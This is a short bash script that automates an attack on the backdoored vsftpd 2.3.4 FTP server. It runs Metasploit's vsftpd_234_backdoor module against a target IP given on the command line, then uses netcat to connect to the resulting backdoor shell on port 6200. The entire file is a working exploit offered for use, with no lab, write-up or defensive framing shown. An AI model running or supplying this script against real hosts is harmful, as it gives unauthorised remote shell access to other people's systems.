#!/bin/bash

# Check if target IP was provided
if [ -z "$1" ]; then
  echo "Usage: $0 <target-ip>"
  exit 1
fi

TARGET_IP="$1"

# Step 1: Run the exploit with Metasploit
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set PAYLOAD cmd/unix/interact;
set RHOSTS $TARGET_IP;
set RPORT 21;
run;
exit;
"

# Step 2: Wait briefly for the backdoor shell to activate
sleep 2

# Step 3: Try to connect to the backdoor shell (port 6200)
echo "[*] Attempting to connect to backdoor shell on $TARGET_IP:6200"
nc $TARGET_IP 6200
